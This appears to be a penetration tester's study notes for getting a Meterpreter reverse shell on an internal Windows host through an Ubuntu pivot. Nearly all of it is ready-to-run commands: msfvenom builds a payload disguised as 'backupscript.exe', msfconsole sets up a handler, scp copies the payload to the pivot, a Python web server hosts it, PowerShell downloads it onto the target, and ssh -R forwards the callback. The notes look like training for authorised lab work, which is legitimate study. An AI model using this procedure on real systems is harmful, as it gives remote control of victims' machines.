
We want to create a reverse shell on the Windows host, but it cannot route traffic to our attack host since it is only on the local network 172...

We must route traffic through the pivot host.
- Create listener on attack host
- Create and copy a payload for the pivot host
- Start webserver on pivot host
- Download payload to the Windows host via webserver on pivot host
- Use ssh -R to forward msfconsole traffic from ubuntu server to listener on attack host

**Creating a Windows Payload with msfvenom
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

**Configuring & Starting the multi/handler (msfconsole)
```shell-session
use exploit/multi/handler
```
```shell-session
set payload windows/x64/meterpreter/reverse_https
```
```shell-session
set lhost 0.0.0.0
```
```shell-session
set lport 8000
```
```shell-session
run
```
- Copy this payload to the ubuntu server using scp

**Transferring Payload to Pivot Host
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
- Then, create a python3 HTTP server on the Ubuntu server in the same directory where we copied our payload

**Starting Python3 Webserver on Pivot Host
```shell-session
python3 -m http.server 8123
```
- Now, download payload on Windows target using Invoke-WebRequest or a web browser

**Downloading Payload on the Windows Target
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

**Using SSH -R (on attack host)
```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
- -R command asks the Ubuntu server to listen on targetIPaddress:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host

![[Pasted image 20250624145759.png]]

